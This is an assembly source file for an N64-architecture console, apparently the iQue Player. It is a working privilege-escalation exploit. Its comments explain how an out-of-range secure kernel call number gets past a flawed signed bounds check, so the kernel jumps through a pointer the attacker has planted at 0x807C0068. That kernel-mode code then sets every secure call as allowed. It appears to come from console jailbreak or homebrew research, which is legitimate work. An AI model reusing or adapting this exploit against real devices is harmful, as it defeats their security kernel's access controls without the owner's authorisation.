.n64                ; Set the architecture to N64
.open "00200f70.sta",0x807C0000

start:
  li $v0, 0xF82ED0AE   ; set up out of range SKC 0xF82ED0AE. SK will use a flawed signed compare to be sure this is within the SKC table bounds. 
                       ; SK will check the bottom 5 bits, which, when a 1 is shifted left by the amount in the bottom 5 bits, has to correspond to a bit in the allowed SKC bitmask, or the call fails.
                       ; then it does func_ptr = skc_num * 4 + 0x9FC0BDB0 (0x9FC0BDB0 being the skc func ptr table address) for a final result of 0x807C0068. 
                       ; The function pointer will be read from there.
  li $t0, 0xA4300014
  lw      $t1, 0($t0)
  nop
  bgez $zero, usermode_code

.org 0x807C0068

  .word 0x807C006C
  li $t1, 0x9FC0F348
  lw  $t0, 0($t1) ; read allowed SKC bitmask
  nop
  ori $t0, $t0, 0x7FF ; set all SKCs allowed
  sw  $t0, 0($t1) ; store back
  jr $ra ; jump back to SKC handler
  nop

usermode_code:
infloop:
  bgez $zero, infloop
  nop

.org 0x807C7FFC
  .word 0
.close

; make sure to leave an empty line at the end
